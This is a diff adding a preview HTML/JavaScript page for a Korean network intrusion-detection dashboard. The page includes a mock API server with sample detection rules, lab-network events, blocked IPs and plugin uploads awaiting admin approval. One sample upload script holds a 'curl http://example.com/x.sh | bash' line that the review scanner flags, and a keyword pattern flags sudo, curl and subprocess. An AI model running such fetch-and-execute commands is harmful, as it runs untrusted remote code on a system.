+      <label>대상 포트 (쉼표로 구분, 비우면 전체)<input id="rPorts" class="txt" placeholder="23, 2323"></label>
+      <label>TCP 조건<select id="rFlags"><option value="syn">새 연결 시도(SYN)만</option><option value="any">모든 TCP 패킷</option></select></label>
+      <label>횟수 (이 이상이면 탐지)<input id="rCount" class="txt num" type="number" min="1" value="5"></label>
+      <label>기간(초)<input id="rWindow" class="txt num" type="number" min="1" max="3600" value="30"></label>
+      <label>세는 방법<select id="rDistinct"><option value="none">패킷 수</option><option value="dst_port">서로 다른 포트 수</option></select></label>
+      <label>위험도<select id="rSev"><option value="info">Low</option><option value="warning" selected>Medium</option><option value="critical">Critical</option></select></label>
+      <div class="wide" id="rBlockBox"></div>
+      <button class="btn primary">규칙 저장</button>
+    </form>
+    <div id="ruleMsg"></div>
+  </details>
+
+  <details class="expander" id="ruleUpBox">
+    <summary>📤 플러그인 방식 규칙 올리기 (승인 대기)</summary>
+    <div>
+      <p>플러그인 방식 규칙은 <b>올리기</b>로만 추가합니다. 규칙 설정 파일(<code>rule.json</code>)과 판정 스크립트(<code>.py</code> / <code>.sh</code>)를 함께 올리세요. 올려도 <b>바로 적용되지 않습니다</b>:
+        '승인 대기' 칸에만 저장되고, 관리자가 <b>보안 서버 터미널</b>에서 내용을 읽어 보고 승인하면 <code>rules/</code> 에 <b>꺼진 상태</b>로 설치됩니다. 그다음 위 카드에서 직접 '켜기'를 누릅니다. 대시보드에는 승인 버튼이 없습니다.</p>
+      <p class="caption">한 번에 6개, 파일당 64KB 까지. 어떻게 구성해야 하는지(rule.json 항목, 스크립트가 내보낼 출력 형식)는 안내 PDF를 받아서 보세요.</p>
+      <div class="rulebar">
+        <a class="btn sm" href="guide_rule.pdf" download>📄 구성 안내 PDF 받기</a>
+        <input type="file" id="ruleUpFiles" multiple accept=".json,.py,.sh">
+        <button class="btn sm" id="ruleUpSend" type="button">⬆ 올리기</button>
+      </div>
+      <div id="ruleUpMsg"></div>
+      <h4 class="subh">승인 대기 중</h4>
+      <div id="ruleUpList"></div>
+    </div>
+  </details>
+  <details class="expander"><summary>📝 규칙 변경 기록</summary><div id="ruleLogBox"></div></details>
+</section>
+<section class="view" data-view="report" hidden>
+  <h2>📄 점검·보고서</h2>
+  <div class="rulebar noprint">
+    <button class="btn sm" id="repReload" type="button">🔄 다시 만들기</button>
+    <button class="btn sm" id="repPrint" type="button">🖨 인쇄 / PDF 저장</button>
+    <button class="btn sm" id="repCsv" type="button">⬇ CSV 받기</button>
+    <span class="caption" id="repAt"></span>
+  </div>
+  <div class="noprint"><h3>✅ 시연 전 점검</h3><ul class="checks" id="preflight"></ul></div>
+  <h3>요약</h3><div class="metrics" id="repSummary"></div>
+  <h3>📈 최근 24시간 탐지 수</h3><div id="chartTime"></div>
+  <div class="chartrow">
+    <div><h3>공격자 순위 (탐지 수)</h3><div id="chartIps"></div></div>
+    <div><h3>유형별 탐지 수</h3><div id="chartTypes"></div></div>
+  </div>
+  <h3>탐지 규칙</h3>
+  <div class="df print-full"><table><thead><tr><th>규칙</th><th>상태</th><th>위험도</th><th>대응</th><th>탐지</th><th>마지막</th></tr></thead><tbody id="repRules"></tbody></table></div>
+  <h3>탐지 기록 (최근 1000건까지)</h3>
+  <div class="df print-full"><table><thead><tr><th>시간</th><th>출발지</th><th>이벤트</th><th>위험도</th><th>상태</th><th>상세</th></tr></thead><tbody id="repEvents"></tbody></table></div>
+</section>
+</main>
+</div>
+<div id="toasts" aria-live="polite"></div>
+<dialog id="tlDialog">
+  <h3 id="tlTitle"></h3>
+  <div id="tlBody"></div>
+  <div class="dlgbtns">
+    <button class="btn" id="tlBlock" type="button">🚫 이 대상 차단하러 가기</button>
+    <button class="btn primary" id="tlClose" type="button">닫기</button>
+  </div>
+</dialog>
+<dialog id="pluginDialog">
+  <h3 id="pdTitle"></h3>
+  <div class="ptags" id="pdTags"></div>
+  <p class="caption" id="pdDesc"></p>
+  <div class="row" id="pdParams"></div>
+  <div class="row" id="pdActions"></div>
+  <div id="pdStatus" class="caption"></div>
+  <div id="pdOut"></div>
+  <div class="dlgbtns"><button class="btn primary" id="pdClose" type="button">닫기</button></div>
+</dialog>
+<dialog id="evDialog">
+  <h3 id="evTitle">ℹ️ 침입 상세 분석</h3>
+  <div id="evBody"></div>
+  <div class="dlgbtns">
+    <button class="btn" id="evRefresh" type="button">🔄 다시 분석</button>
+    <button class="btn" id="evPcap" type="button" hidden title="이 공격의 출발지가 탐지 직전에 보낸 패킷을 .pcap 파일로 받습니다">📦 관련 패킷 (PCAP)</button>
+    <button class="btn" id="evBlockGo" type="button" hidden>🚫 이 IP 차단하러 가기</button>
+    <button class="btn primary" id="evClose" type="button">닫기</button>
+  </div>
+</dialog>
+<dialog id="editDialog">
+  <h3>✏️ 규칙 수정</h3>
+  <form id="editForm" method="dialog">
+    <div id="editFields" class="editgrid"></div>
+    <div id="editNotes"></div>
+    <div id="editMsg"></div>
+    <div class="dlgbtns"><button class="btn" id="editCancel" type="button">취소</button><button class="btn primary">저장</button></div>
+  </form>
+</dialog>
+<dialog id="delDialog">
+  <h3>🗑️ 규칙을 삭제할까요?</h3>
+  <dl id="delBody"></dl>
+  <div id="delNotes"></div>
+  <div class="dlgbtns"><button class="btn" id="delCancel" type="button">취소</button><button class="btn primary" id="delOk" type="button">삭제</button></div>
+</dialog>
+<script>
+/* 미리보기 전용 가짜 서버: 실제 Guardian/대시보드 서버 없이 화면을 확인하기 위한 것.
+   모든 데이터는 메모리에만 있고 새로고침하면 처음 상태로 돌아간다. */
+(function () {
+  Storage.prototype.getItem = function (k) { return k === "gd_token" ? "preview" : null; };
+  Storage.prototype.setItem = function () {};
+
+  const now = () => Math.floor(Date.now() / 1000);
+  const iso = (t) => new Date(t * 1000 - new Date().getTimezoneOffset() * 60000).toISOString().slice(0, 19);
+  const t0 = now();
+  let dryRun = true;
+
+  const B = (id, name, desc, severity, block, extra) => ({id, detector: id, name, description: desc, enabled: true, severity, block, ...extra});
+  const rules = [
+    B("port_scan", "포트 스캔", "짧은 시간에 여러 포트를 두드려 열린 문을 찾는 행위 (nmap 등)", "warning", true, {tags: ["포트스캔", "정찰"], window_sec: 10, distinct_ports: 20}),
+    B("syn_flood", "SYN 플러드", "연결 요청(SYN)을 쏟아부어 서버를 마비시키는 공격. 출발지를 위조한 경우는 합계로 따로 감시", "critical", true,
+      {tags: ["플러드", "DoS"], window_sec: 5, max_syn: 200, global_max_syn: 1000, global_min_sources: 10, block_duration_sec: 36000}),
+    B("icmp_flood", "핑 플러드", "ping 을 대량으로 보내 네트워크를 가득 채우는 공격", "warning", true, {tags: ["핑", "플러드", "DoS"], window_sec: 5, max_packets: 50}),
+    B("ssh_bruteforce", "SSH 무차별 대입", "SSH 로그인을 계속 시도해 비밀번호를 알아내려는 공격", "critical", true, {tags: ["SSH", "무차별대입", "계정탈취"], ports: [22], window_sec: 60, max_attempts: 10, block_permanent: true}),
+    B("ssh_login_success", "SSH 로그인 성공 (공격 뒤)", "로그인 실패가 반복되던 IP 에서 SSH 로그인이 성공하면 알림 (sshd 로그를 읽음)", "critical", true, {tags: ["SSH", "계정탈취", "로그인"], window_sec: 600, min_failures: 5}),
+    B("arp_spoof", "ARP 스푸핑", "같은 IP 의 MAC 주소를 속여 통신을 가로채려는 공격", "critical", true, {tags: ["ARP", "중간자공격"]}),
+    B("exfiltration", "대량 데이터 유출", "서버에서 외부로 비정상적으로 많은 데이터가 나가는 상황 (알림만)", "warning", false, {tags: ["유출", "데이터"], window_sec: 60, max_bytes: 50000000}),
+    {id: "telnet_probe", detector: "custom", name: "텔넷 접속 시도", description: "예제 규칙: 23번 포트로 새 연결을 반복해서 시도하면 알림 (꺼진 상태로 제공)",
+      tags: ["텔넷", "포트공격", "예제"], enabled: false, protocol: "tcp", dst_ports: [23], tcp_flags: "syn", count: 5, window_sec: 30, distinct: "none", severity: "warning", block: false},
+  ];
+  const events = [
+    {id: "e3", timestamp: iso(t0 - 120), type: "icmp_flood", severity: "warning", source: "192.168.56.20", target: "192.168.56.10", detail: "5초 동안 ping 61개", action: "block(dry-run)"},
+    {id: "e2", timestamp: iso(t0 - 600), type: "ssh_bruteforce", severity: "critical", source: "192.168.56.20", target: "192.168.56.10", detail: "60초 동안 SSH 접속 시도 12회", action: "block(dry-run)"},
+    {id: "e1", timestamp: iso(t0 - 900), type: "port_scan", severity: "warning", source: "192.168.56.20", target: "192.168.56.10", detail: "10초 동안 서로 다른 포트 20개에 접속 시도", action: "block(dry-run)"},
+  ];
+  const blocked = {
+    "192.168.56.20": {reason: "icmp_flood", since: t0 - 120, until: t0 + 180, permanent: false},
+    "192.168.56.30": {reason: "manual", since: t0 - 3000, until: null, permanent: true},
+  };
+  const notes = {"192.168.56.30": "시연 중 SSH 공격자"};
+  const wl = ["127.0.0.1", "192.168.56.10", "192.168.57.1", "192.168.57.10"];
+  const changes = [];
+  const plugins = [
+    {id: "heartbeat", name: "하트비트 (서비스 예제)", description: "중지할 때까지 계속 실행되는 '서비스형' 플러그인 예제입니다. 서버 부하를 그래프로 보여 줍니다 (@gui chart). 새 플러그인을 만들 때 참고하세요.", kind: "service",
+      tags: ["예제", "서비스"], params: [{name: "interval", label: "출력 간격(초)", type: "int", default: 2}]},
+    {id: "net_connections", name: "현재 접속 목록", description: "서버가 열고 있는 포트와 현재 연결(ss)을 보여줍니다.", kind: "task", tags: ["네트워크", "포트", "점검"], params: []},
+    {id: "ping_check", name: "핑 확인", description: "지정한 IP 로 ping 3번을 보내 연결 상태를 확인합니다.", kind: "task", tags: ["핑", "연결확인"],
+      params: [{name: "host", label: "대상 IP", type: "ip", default: "192.168.56.20"}]},
+    {id: "system_info", name: "시스템 상태", description: "가동 시간, 디스크, 메모리 사용량을 보여줍니다.", kind: "task", tags: ["시스템", "점검"], params: []},
+    {id: "port_attack_demo", name: "포트 스캔 시연 (예시)", description: "공격자 VM 에서 서버로 포트 스캔을 쏘는 시연용 도구의 모양 예시입니다 (미리보기 전용).", kind: "task",
+      tags: ["포트공격", "시연", "공격자VM"], params: [{name: "host", label: "대상 IP", type: "ip", default: "192.168.56.10"}]},
+  ];
+  const runs = {}, timers = {};
+  const history = {
+    "192.168.56.20": {total: 3, blocks: 3, by_type: {port_scan: 1, ssh_bruteforce: 1, icmp_flood: 1}, first: iso(t0 - 900), last: iso(t0 - 120)},
+    "192.168.56.30": {total: 1, blocks: 1, by_type: {manual_block: 1}, first: iso(t0 - 3000), last: iso(t0 - 3000)},
+  };
+
+  const SAMPLE = {
+    system_info: ['@gui {"type":"metric","label":"가동 시간","value":"34 minutes"}', '@gui {"type":"metric","label":"디스크(/) 사용","value":19.2,"unit":"%","max":100}',
+      '@gui {"type":"metric","label":"메모리 사용","value":65.5,"unit":"%","max":100}', '@gui {"type":"metric","label":"부하(1분) / CPU 2개","value":0.42,"max":2}',
+      '@gui {"type":"bars","title":"부하 평균","items":[["1분",0.42],["5분",0.35],["15분",0.3]]}',
+      '@gui {"type":"table","title":"용량","columns":["항목","전체","사용","남음"],"rows":[["디스크(/)","78 GB","15 GB","58 GB"],["메모리","5900 MB","3865 MB","2035 MB"]]}',
+      "== 가동 시간 ==", "up 34 minutes", "", "== 디스크(/) ==", "전체 78 GB / 사용 15 GB / 남음 58 GB", "", "== 메모리 ==", "Mem: 1.9Gi used / 1.0Gi available"],
+    net_connections: ["tcp LISTEN 0 128 0.0.0.0:22", "tcp LISTEN 0 5 192.168.57.10:8080", "tcp ESTAB 0 0 192.168.57.10:8080 192.168.57.1:50317"],
+    ping_check: ["PING 192.168.56.20 56(84) bytes of data.", "64 bytes from 192.168.56.20: icmp_seq=1 ttl=64 time=0.4 ms", "3 packets transmitted, 3 received, 0% packet loss"],
+  };
+
+  // 승인 대기 중인 플러그인 예시 (실제로는 서버 터미널의 approve_plugin.py 로만 승인)
+  const uploads = [{id: "demo_rule", type: "rule", name: "예시 규칙", description: "예시 업로드 (플러그인 방식 규칙)", kind: "rule", tags: ["로그인", "계정"], short: "5a4b3c2d1e0f", hash: "5a4b3c2d1e0f", intact: true,
+    uploaded_at: iso(now() - 300), uploader: "192.168.57.1", rule: {severity: "warning", block: false, interval_sec: 10, command: ["./check_demo.py"]},
+    files: [{name: "rule.json", size: 190, sha256: "333333333333"}, {name: "check_demo.py", size: 120, sha256: "444444444444"}], findings: [],
+    texts: {"rule.json": '{\n  "id": "demo_rule",\n  "detector": "script",\n  "command": ["./check_demo.py"],\n  "interval_sec": 10\n}',
+            "check_demo.py": 'import json\nprint(json.dumps({"source": "192.168.56.99", "detail": "예시 판정"}))\n'}},
+    {id: "demo_scan", type: "tool", name: "데모 스캔", description: "예시 업로드", kind: "task", tags: ["포트공격"], short: "9f8e7d6c5b4a", hash: "9f8e7d6c5b4a", intact: true,
+    uploaded_at: iso(now() - 600), uploader: "192.168.57.1",
+    files: [{name: "plugin.json", size: 210, sha256: "111111111111"}, {name: "run.sh", size: 64, sha256: "222222222222"}],
+    findings: [{file: "run.sh", line: 2, what: "외부 통신 도구", text: "curl http://example.com/x.sh | bash"}],
+    texts: {"plugin.json": '{\n  "id": "demo_scan",\n  "name": "데모 스캔",\n  "command": ["bash", "./run.sh"]\n}', "run.sh": "#!/usr/bin/env bash\ncurl http://example.com/x.sh | bash\n"}}];
+
+  // 침입 상세 분석(미리보기용 예시): 실제 분석은 guardian.py 의 analyze_event 가 만든다
+  const AN = {
+    icmp_flood: {name: "핑 플러드", where: ["출발지: 192.168.56.20", "서버와 같은 내부망(192.168.56.0/24) 안의 장비입니다.", "MAC 주소: 08:00:27:aa:bb:cc (ARP 로 확인)", "목표: 이 서버 192.168.56.10"],
+      what: ["ping(ICMP)을 대량으로 보내 네트워크 회선과 CPU 를 소모시키는 공격입니다."], burden: "보통", impact: ["램 부담은 비교적 작지만 회선과 CPU 를 채워 정상 통신이 느려질 수 있습니다."]},
+    ssh_bruteforce: {name: "SSH 무차별 대입", where: ["출발지: 192.168.56.20", "서버와 같은 내부망(192.168.56.0/24) 안의 장비입니다.", "목표: 이 서버 192.168.56.10 (포트 22)"],
+      what: ["SSH 로그인(보통 22번 포트)을 계속 시도하며 비밀번호를 하나씩 대입해 보는 공격입니다."], burden: "낮음",
+      impact: ["서버 부담보다 '계정 탈취' 위험이 큰 공격입니다.", "이 표시는 '접속 시도'를 센 것입니다. 로그인이 실제로 성공하면 'SSH 로그인 성공' 탐지가 따로 뜹니다."]},
+    port_scan: {name: "포트 스캔", where: ["출발지: 192.168.56.20", "서버와 같은 내부망(192.168.56.0/24) 안의 장비입니다.", "목표: 이 서버 192.168.56.10 (포트 1000, 1001, 1002 …)"],
+      what: ["서버에서 열려 있는 문(포트)을 찾으려고 여러 포트를 차례로 두드리는 정찰 행위입니다 (nmap 같은 도구)."], burden: "낮음",
+      impact: ["스캔 자체는 서버의 램·CPU 에 큰 부담을 주지 않습니다.", "하지만 열려 있는 서비스가 공격자에게 알려져 다음 공격의 표적이 됩니다."]},
+  };
+  function analysisFor(ev) {
+    const a = AN[ev.type] || AN.port_scan, isBlocked = ev.source in blocked && !dryRun;
+    const head = isBlocked ? {level: "good", text: "성공적으로 막아냈습니다."}
+      : {level: "bad", text: "막지 못했고 공격이 계속되고 있습니다. 서버 부담이 이어질 수 있어 IP 차단을 추천합니다."};
+    return {event: ev, name: a.name, headline: head, burden: a.burden, recent_packets: isBlocked ? 0 : 38,
+      server_now: {mem_percent: 41.3, load1: 0.52, cpus: 2}, actions: {can_block: !isBlocked, target: ev.source},
+      sections: [{title: "📍 어디서 공격했나", lines: a.where}, {title: "⚔️ 어떤 공격인가", lines: [...a.what, ev.detail]},
+        {title: "💥 서버에 준 영향", lines: ["5초 동안 61개 (탐지 기준 50개의 1.2배)", `서버 부담(램·CPU·회선) 추정: ${a.burden} — 실제로 잰 값이 아니라 공격 종류와 횟수로 짐작한 값입니다.`, ...a.impact]},
+        {title: "🛡️ 대응 결과", lines: isBlocked ? ["방화벽(iptables)이 이 IP 를 차단했습니다 (180초 남음)."]
+          : ["dry-run(탐지만) 모드라 실제로 막지 않았습니다. 이 공격은 그대로 서버에 들어왔습니다.", "지금 상태: 최근 10초 동안 이 출발지에서 온 패킷 38개 (공격이 계속되는 중)"]},
+        {title: "✅ 권고", lines: ["🚫 이 IP 차단을 추천합니다 (아래 버튼 또는 '보안 정책 제어').", "같은 출발지가 3번 탐지된 반복 공격자입니다. 영구 차단을 고려하세요.",
+          "지금은 dry-run(탐지만) 모드입니다. 실제로 막으려면 왼쪽 '개요' 메뉴의 '관제 서버 상태' 슬라이드를 '실제 차단'으로 바꾸세요."]}],
+      evidence: [["이벤트 ID", ev.id], ["발생 시각", ev.timestamp.replace("T", " ")], ["탐지 유형", ev.type], ["위험도", ev.severity], ["출발지", ev.source], ["당시 조치", ev.action], ["상세", ev.detail]]};
+  }
+
+  // 패킷 보기용 가짜 패킷: 조회할 때마다 핑(요청+응답)과 가끔 TCP 를 새로 만들어 쌓는다
+  const pk = [];
+  let pkSeq = 0, pkPing = 0, pkAt = now() - 8;
+  const addPk = (o) => { pk.push({seq: ++pkSeq, time: Date.now() / 1000, len: 98, ...o}); if (pk.length > 500) pk.shift(); };
+  function tickPk() {
+    for (; pkAt < now(); pkAt++) {
+      pkPing++;
+      addPk({src: "192.168.56.20", dst: "192.168.56.10", dir: "in", proto: "ICMP", info: `Echo request (ping 요청) id=0x1a2b seq=${pkPing}`});
+      addPk({src: "192.168.56.10", dst: "192.168.56.20", dir: "out", proto: "ICMP", info: `Echo reply (ping 응답) id=0x1a2b seq=${pkPing}`});
+      if (pkPing % 4 === 0) addPk({src: "192.168.56.20", dst: "192.168.56.10", dir: "in", proto: "TCP", sport: 41000 + pkPing, dport: 22, len: 60, info: `${41000 + pkPing} → 22 [SYN]`});
+      if (pkPing % 7 === 0) addPk({src: "192.168.56.20", dst: "192.168.56.10", dir: "in", proto: "ARP", len: 42, info: "Who has 192.168.56.10? Tell 192.168.56.20"});
+    }
+  }
+
+  function log(rule, detail) { changes.push({timestamp: iso(now()), rule, detail}); }
+  function reply(obj, code) {
+    return Promise.resolve(new Response(JSON.stringify(obj), {status: code || 200, headers: {"Content-Type": "application/json"}}));
+  }
+  function bookkeep(h) {
+    return Object.entries(h).map(([k, a]) => ({source: k, total: a.total, blocks: a.blocks, by_type: a.by_type, first: a.first, last: a.last,
+      note: notes[k] || "", blocked_now: k in blocked})).sort((a, b) => b.total - a.total);
+  }
+
+  window.fetch = function (url, opts) {
+    const u = new URL(url, "http://x"), p = u.pathname, post = opts && opts.method === "POST";
+    const body = post && opts.body ? JSON.parse(opts.body) : {};
+    if (!post) {
+      if (p === "/api/status") return reply({status: "running", uptime_sec: now() - t0 + 5400, interface: "eth0", my_ip: "192.168.56.10", dry_run: dryRun,
+        blocked_count: Object.keys(blocked).length, stats: {events_total: events.length, blocks_auto: 0, blocks_auto_sim: 3, packets_total: 48210 + (now() - t0) * 40},
+        whitelist: wl, whitelist_fixed: ["127.0.0.1", "192.168.56.10", "192.168.57.10"], utc_offset: "+09:00", server: {mem_percent: 41.3, load1: 0.52, cpus: 2}, missed_packets: 0, notes: {...notes}});
+      if (p === "/api/events") {
+        if (now() - t0 > 12 && !events.some((e) => e.id === "e9"))                       // 미리보기에서 새 위협 알림을 볼 수 있게 한 번 추가
+          events.unshift({id: "e9", timestamp: iso(now()), type: "ssh_login_success", severity: "critical", source: "192.168.56.20", target: "192.168.56.10", detail: "로그인 실패 6회 뒤 'kali' 계정 로그인 성공 (password)", action: "block(dry-run)"});
+        const src = u.searchParams.get("source");
+        return reply({events: src ? events.filter((e) => e.source === src) : events});
+      }
+      if (p === "/api/whoami") return reply({ip: "192.168.57.1"});
+      if (p === "/api/audit") return reply({audit: [{time: iso(now() - 300), ip: "192.168.57.1", action: "/api/block", detail: {target: "192.168.56.30", permanent: true}, code: 200}, {time: iso(now() - 900), ip: "192.168.57.9", action: "login_failed", detail: {}, code: 401}]});
+      if (p === "/api/pcap") return reply({error: "미리보기에는 실제 패킷 기록이 없어 PCAP 파일을 만들 수 없습니다 (서버의 대시보드에서 받으세요)"}, 404);
+      if (p === "/api/packets") {
+        tickPk();
+        const since = +u.searchParams.get("since") || 0, proto = u.searchParams.get("proto") || "", ip = u.searchParams.get("ip") || "";
+        const hide = (u.searchParams.get("hide_ports") || "").split(",").filter(Boolean).map(Number);
+        const rows = pk.filter((x) => x.seq > since && (!proto || x.proto === proto) && (!ip || x.src.startsWith(ip) || x.dst.startsWith(ip))
+          && !hide.includes(x.sport) && !hide.includes(x.dport));
+        return reply({enabled: true, packets: rows.slice(-200), last_seq: pkSeq, buffer: 2000, unrecorded: 0, my_ip: "192.168.56.10"});
+      }
+      if (p === "/api/blocked") return reply({blocked: Object.entries(blocked).map(([k, v]) => ({target: k, reason: v.reason, since: iso(v.since),
+        permanent: v.permanent, note: notes[k] || "", until: v.until && iso(v.until), remaining_sec: v.until === null ? null : v.until - now()})), simulated: dryRun});
+      if (p === "/api/history") return reply({history: bookkeep(history)});
+      if (p === "/api/rules") return reply({dry_run: dryRun, rules, errors: {}, default_block_sec: 300, hits: Object.fromEntries(rules.filter((r) => events.some((e) => e.type === r.id)).map((r) => [r.id, {count: events.filter((e) => e.type === r.id).length, last: events.find((e) => e.type === r.id).timestamp}]))});
+      if (p === "/api/rule_changes") return reply({changes: [...changes].reverse()});
+      if (p === "/api/event_analysis") {
+        const ev = events.find((e) => e.id === u.searchParams.get("id"));
+        return ev ? reply(analysisFor(ev)) : reply({error: "이벤트를 찾을 수 없습니다"}, 404);
+      }
+      if (p === "/api/plugin_uploads") return reply({uploads: uploads.map(({texts, ...rest}) => rest)});
+      const up = p.match(/^\/api\/plugin_uploads\/([a-z0-9_]+)$/);
+      if (up) { const x = uploads.find((y) => y.id === up[1]); return x ? reply(x) : reply({error: "없는 승인 대기 항목"}, 404); }
+      if (p === "/api/plugins") return reply({errors: {}, plugins: plugins.map((pl) => ({...pl, running: !!timers[pl.id], last_run: runs[pl.id] || null}))});
+      return reply({error: "not found"}, 404);
+    }
+    if (p === "/api/plugin_uploads") {
+      const f = body.files || {}, isRule = "rule.json" in f, pj = isRule ? f["rule.json"] : f["plugin.json"];
+      if (!pj) return reply({error: "plugin.json (도구) 또는 rule.json (탐지 규칙) 이 필요합니다"}, 400);
+      if (body.expect && body.expect !== (isRule ? "rule" : "tool")) return reply({error: "이 칸에는 " + (body.expect === "tool" ? "plugin.json (도구)" : "rule.json (탐지 규칙)") + " 을 올려야 합니다"}, 400);
+      let m; try { m = JSON.parse(pj); } catch (e) { return reply({error: (isRule ? "rule.json" : "plugin.json") + " 형식 오류: " + e.message}, 400); }
+      const u = {id: m.id, type: isRule ? "rule" : "tool", name: m.name || m.id, description: m.description || "", kind: isRule ? "rule" : (m.kind || "task"), tags: m.tags || [], short: "a1b2c3d4e5f6", hash: "a1b2c3d4e5f6", intact: true,
+        uploaded_at: iso(now()), uploader: "192.168.57.1", files: Object.keys(f).map((n) => ({name: n, size: f[n].length, sha256: "0123456789ab"})),
+        findings: Object.entries(f).flatMap(([n, t]) => t.split("\n").flatMap((l, i) => /sudo|curl|subprocess/.test(l) ? [{file: n, line: i + 1, what: "검토 필요 패턴", text: l.trim()}] : [])), texts: f};
+      uploads.push(u); return reply({ok: true, upload: u});
+    }
+    if (/^\/api\/plugin_uploads\/[a-z0-9_]+\/run_sandboxed$/.test(p)) return new Promise((res) => setTimeout(() => res(reply({rc: 0, timed_out: false, findings: [], output: "(미리보기) 격리 상태에서 실행한 출력 예시\n{\"source\": \"192.168.56.99\", \"detail\": \"예시 판정\"}\n"})), 1500));
+    const upd = p.match(/^\/api\/plugin_uploads\/([a-z0-9_]+)\/delete$/);
+    if (upd) { const i = uploads.findIndex((x) => x.id === upd[1]); if (i >= 0) uploads.splice(i, 1); return reply({ok: i >= 0}); }
+    if (p === "/api/block") {
+      const cur = blocked[body.target];
+      if (cur && !body.overwrite) return reply({ok: false, exists: true, reason: "이미 차단 중", current: {reason: cur.reason, since: iso(cur.since),
+        permanent: cur.permanent, note: notes[body.target] || "", remaining_sec: cur.until === null ? null : cur.until - now()}});
+      blocked[body.target] = {reason: body.reason || "manual", since: now(), until: body.permanent ? null : now() + body.duration_sec, permanent: !!body.permanent};
+      if (body.note) notes[body.target] = body.note;
+      return reply({ok: true});
+    }
+    if (p === "/api/unblock") { const ok = delete blocked[body.target]; return reply({ok}); }
+    if (p === "/api/note") { if (body.note) notes[body.target] = body.note; else delete notes[body.target]; return reply({ok: true}); }
+    if (p === "/api/dry_run") { const changed = dryRun !== body.dry_run; dryRun = body.dry_run; return reply({ok: true, dry_run: dryRun, changed}); }
+    if (p === "/api/whitelist") {
+      const t = String(body.target || "").replace(/^mac:/, "");
+      if (body.action === "add") {
+        if (wl.includes(t)) return reply({ok: false, reason: "이미 화이트리스트에 있습니다"});
+        wl.push(t); wl.sort(); const freed = t in blocked; delete blocked[t]; log("whitelist", "추가: " + t);
+        return reply({ok: true, reason: "", unblocked: freed, whitelist: wl});
+      }
+      if (["127.0.0.1", "192.168.56.10", "192.168.57.10"].includes(t)) return reply({ok: false, reason: "서버 자신의 주소는 뺄 수 없습니다 (Guardian 이 자기 자신을 차단하게 됩니다)"});
+      const i = wl.indexOf(t);
+      if (i < 0) return reply({ok: false, reason: "화이트리스트에 없습니다"});
+      wl.splice(i, 1); log("whitelist", "삭제: " + t);
+      return reply({ok: true, reason: "", unblocked: false, whitelist: wl});
+    }
+    if (p === "/api/rules/enable") { const r = rules.find((x) => x.id === body.id); r.enabled = body.enabled; log(r.id, body.enabled ? "켜짐" : "꺼짐"); return reply({ok: true}); }
+    if (p === "/api/rules/update") {
+      const i = rules.findIndex((x) => x.id === body.id);
+      if (i < 0) return reply({ok: false, reason: "없는 규칙"});
+      const old = rules[i], nw = {...body.rule, id: old.id, detector: old.detector, enabled: old.enabled};
+      if (nw.notify && !Object.keys(nw.notify).length) delete nw.notify;
+      const strip = (o) => JSON.stringify(Object.entries(o).filter(([k, v]) => k !== "notify" && v !== undefined).sort());
+      if (strip(nw) === strip(old) && JSON.stringify(nw.notify || {}) !== JSON.stringify(old.notify || {})) {
+        rules[i] = nw; log(old.id, "알림 설정 변경"); return reply({ok: true, changed: true, was_enabled: old.enabled, kept_enabled: true});
+      }
+      if (!nw.block) { delete nw.block_duration_sec; delete nw.block_permanent; } else if (nw.block_permanent) delete nw.block_duration_sec;
+      for (const k of ["count", "window_sec"]) if (k in nw && !(nw[k] >= 1)) return reply({error: `'${k}' 는 1 이상의 정수여야 합니다`}, 400);
+      const same = JSON.stringify(Object.entries(nw).filter(([, v]) => v !== undefined).sort()) === JSON.stringify(Object.entries(old).sort());
+      if (same) return reply({ok: true, changed: false, was_enabled: old.enabled});
+      const was = old.enabled; rules[i] = {...nw, enabled: false};
+      log(old.id, was ? "수정됨 (자동으로 꺼짐)" : "수정됨 (꺼짐 상태 유지)");
+      return reply({ok: true, changed: true, was_enabled: was});
+    }
+    if (p === "/api/rules/delete") {
+      const i = rules.findIndex((x) => x.id === body.id);
+      if (i < 0) return reply({ok: false, reason: "없는 규칙"});
+      const was = rules[i].enabled;
+      if (was) log(body.id, "꺼짐 (삭제 전 자동 비활성화)");
+      rules.splice(i, 1); log(body.id, "삭제됨"); return reply({ok: true, was_enabled: was});
+    }
+    if (p === "/api/rules") {
+      const r = body.rule, i = rules.findIndex((x) => x.id === r.id);
+      if (i >= 0) return reply({error: `이미 있는 규칙 ID 입니다: ${r.id}`}, 409);
+      const full = {detector: "custom", ...r};
+      if (!full.block) { delete full.block_duration_sec; delete full.block_permanent; } else if (full.block_permanent) delete full.block_duration_sec;
+      if (i >= 0) rules[i] = full; else rules.push(full);
+      log(r.id, i >= 0 ? "수정됨" : "추가됨"); return reply({ok: true, id: r.id});
+    }
+    const m = p.match(/^\/api\/plugins\/([\w-]+)\/(run|stop)$/);
+    if (m) {
+      const [, id, action] = m;
+      if (action === "stop") { clearInterval(timers[id]); delete timers[id]; if (runs[id]) runs[id].status = "stopped"; return reply({ok: true}); }
+      if (id === "heartbeat") {
+        const run = runs[id] = {status: "running", output: [], command: "heartbeat"}; let n = 0;
+        timers[id] = setInterval(() => {
+          run.output.push(`[${new Date().toTimeString().slice(0, 8)}] 살아있음 #${++n}`,
+            `@gui {"type":"chart","label":"부하(1분)","value":${(0.3 + Math.random() * 0.6).toFixed(2)},"max":2}`, `@gui {"type":"metric","label":"보낸 신호","value":${n},"unit":"회"}`);
+        }, 2000);
+      } else runs[id] = {status: "done", output: SAMPLE[id] || ["(미리보기용 예시 출력)"], command: id};
+      return reply({ok: true});
+    }
+    return reply({error: "not found"}, 404);
+  };
+})();
+
+</script>
+<script>
+"use strict";
+const $ = (s) => document.querySelector(s);
+let token = "";
+try { token = localStorage.getItem("gd_token") || ""; } catch (e) {}
+let lastPackets = null, lastPacketsAt = 0;
+let currentView = "overview";
+
+// ── 안전한 DOM 생성 (공격자가 만든 문자열이 들어와도 HTML 로 해석되지 않음) ──
+function el(tag, attrs, ...kids) {
+  const e = document.createElement(tag);
+  for (const [k, v] of Object.entries(attrs || {})) {
+    if (k === "class") e.className = v;
+    else if (k.startsWith("on")) e.addEventListener(k.slice(2), v);
+    else e.setAttribute(k, v);
+  }
+  for (const c of kids.flat()) if (c != null && c !== false) e.append(c.nodeType ? c : document.createTextNode(c));
+  return e;
+}
+const selecting = (n) => { const sel = window.getSelection(); return !!(sel && sel.toString() && n.contains(sel.anchorNode)); };   // 복사하려고 드래그 중
+const typing = (n) => n.contains(document.activeElement) && /^(INPUT|TEXTAREA|SELECT)$/.test(document.activeElement.tagName);
+const clear = (n) => { while (n.firstChild) n.removeChild(n.firstChild); };
